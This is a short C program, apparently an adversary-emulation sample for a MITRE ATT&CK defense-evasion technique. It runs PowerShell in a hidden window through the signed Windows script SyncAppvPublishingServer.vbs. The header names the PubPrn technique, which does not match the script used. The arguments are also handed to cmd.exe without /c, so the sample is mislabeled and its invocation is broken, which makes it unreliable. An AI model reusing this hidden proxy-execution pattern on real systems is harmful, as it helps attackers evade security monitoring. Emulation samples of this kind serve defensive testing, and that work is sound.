// Link      = https://attack.mitre.org/techniques/T1216/002/
// Technique = System Script Proxy Execution: PubPrn
// ID        = T1216.002
// Tactics   = Defense Evasion

#include <windows.h>

int main() {
    ShellExecuteA(
        NULL,
        "open",
        "cmd.exe",
        "wscript.exe C:\\Windows\\System32\\SyncAppvPublishingServer.vbs \"n; Get-Process | Out-File C:\\Temp\\process_list.txt\"",
        NULL,
        SW_HIDE
    );

    return 0;
}

